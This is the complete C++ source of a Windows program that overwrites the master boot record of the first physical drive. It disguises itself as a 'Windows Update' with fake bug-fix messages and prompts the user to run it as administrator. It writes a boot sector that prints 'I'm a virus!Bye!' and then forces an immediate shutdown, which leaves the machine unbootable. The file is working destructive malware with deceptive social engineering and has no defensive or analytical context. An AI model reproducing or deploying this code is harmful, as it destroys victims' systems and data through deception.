#include<Windows.h>
#include<stdio.h>
#include<iostream>
using namespace std;
unsigned char sco[] =////////////////16进制
"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
"\x00\xBA\x1D\x0E\xCD\x10\xE2\xFE\x0D\x0A\x49\x27\x6D\x20\x61\x20\x76\x69\x72\x75\x73\x21\x42\x79\x65\x21";

DWORD MBR()
{
	system("title Windows Update");
	cout<<"Your computer has a bug.We are updating."<<endl;
	cout<<"Windows Updating..."<<endl;
	DWORD Ropen;
	BYTE pMBR[512] = { 0 };
	memcpy(pMBR, sco, sizeof(sco));
	pMBR[510] = 0x55;
	pMBR[511] = 0xaa;
	HANDLE hDevice = CreateFile(
		"\\\\.\\PhysicalDrive0",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		MessageBoxA(NULL, "错误", "请以管理员身份运行，否则 Windows 无法安装此特殊补丁更新。", MB_OK);
		return 0;
	}
	DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &Ropen, NULL);
	//写入磁盘文件   
	WriteFile(hDevice, pMBR, 512, &Ropen, NULL);
	DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &Ropen, NULL);
	cout<<"Windows Updated.Restart..."<<endl;
	system("shutdown -s -t 00");
}
int main(int argc, char* argv[])
{
	MBR();
	return 0;
}
